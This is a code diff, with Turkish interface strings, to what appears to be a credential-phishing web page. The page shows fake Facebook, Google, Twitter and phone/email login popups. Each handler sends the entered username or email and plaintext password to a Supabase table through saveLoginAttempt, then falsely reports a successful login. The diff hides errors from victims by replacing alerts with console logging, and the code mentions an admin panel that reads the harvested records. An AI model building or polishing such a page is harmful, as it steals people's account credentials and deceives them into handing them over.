@@ -133,11 +133,6 @@
       left: 140%;
     }
     
-    button:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
-    }
-    
     button.facebook {
       background: linear-gradient(135deg, #3b5998, #2d4373);
       color: white;
@@ -156,6 +151,11 @@
     button.phone {
       background: linear-gradient(135deg, #f4b400, #e0a300);
       color: #222;
+    }
+    
+    button:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
     }
     
     .legal {
@@ -1026,7 +1026,7 @@
         await saveLoginAttempt(email, password, 'Facebook', loginTime);
         alert("Facebook ile giriş başarılı!");
       } catch (error) {
-        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+        console.error("Giriş hatası:", error);
       } finally {
         facebookPopup.style.display = 'none';
         facebookForm.reset();
@@ -1038,14 +1038,13 @@
       
       const email = document.getElementById('googleEmail').value;
       const password = document.getElementById('googlePassword').value;
-      const remember = document.getElementById('googleRemember').checked;
       const loginTime = new Date().toLocaleString();
       
       try {
         await saveLoginAttempt(email, password, 'Google', loginTime);
         alert("Google ile giriş başarılı!");
       } catch (error) {
-        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+        console.error("Giriş hatası:", error);
       } finally {
         googlePopup.style.display = 'none';
         googleForm.reset();
@@ -1063,7 +1062,7 @@
         await saveLoginAttempt(username, password, 'Twitter', loginTime);
         alert("Twitter ile giriş başarılı!");
       } catch (error) {
-        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+        console.error("Giriş hatası:", error);
       } finally {
         twitterPopup.style.display = 'none';
         twitterForm.reset();
@@ -1081,7 +1080,7 @@
         await saveLoginAttempt(email, password, 'Phone/Email', loginTime);
         alert("Telefon/e-posta ile giriş başarılı!");
       } catch (error) {
-        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+        console.error("Giriş hatası:", error);
       } finally {
         phonePopup.style.display = 'none';
         phoneForm.reset();
@@ -1110,7 +1109,6 @@
         console.error('Supabase kayıt hatası:', error);
         throw new Error('Veri kaydedilemedi');
       }
-      return true;
     }
     
     // Admin panelini güncelleme (Supabase'den veri çeker)
